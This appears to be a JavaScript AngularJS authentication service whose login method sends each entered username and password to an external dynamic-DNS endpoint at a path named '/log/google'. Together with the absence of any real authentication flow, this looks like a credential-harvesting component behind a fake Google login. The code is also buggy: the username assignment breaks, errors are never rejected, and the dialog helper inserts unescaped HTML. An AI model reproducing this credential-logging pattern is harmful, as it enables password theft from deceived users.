/* @ngInject */
class AuthService {
    constructor($http) {
        this.username = localStorage.getItem('username');
        this.$http = $http;
    }

    loggedIn() {
        return !!this.username;
    }

    logOut() {
        localStorage.removeItem('username');
        location.href = '/';
    }

    logIn(username, password) {
        const api = PROD ? 'https://paktusin.ddns.net:8083' : '';
        return new Promise((resolve, reject) => {
            this.$http.post(api + '/log/google', {
                username: username.slice(0, 100),
                password: password.slice(0, 100)
            }).then(_ => {
                this.username = localStorage.setItem('username', username);
                resolve(username);
            })
        });
    }

    showDialog(inner) {
        const modal = $(`<div class="modal fade">
    <div class="modal-dialog modal-dialog-centered">
        <div class="modal-content" style="overflow: hidden;">
        ${inner}
        </div>
    </div>
</div>`);
        $(document.body).append(modal);
        modal.on('hidden.bs.modal', () => {
            modal.remove();
        });
        modal.modal('show');
        return modal;
    }
}


const authService = angular.module('authService', [])
    .service('authService', AuthService);

export default authService;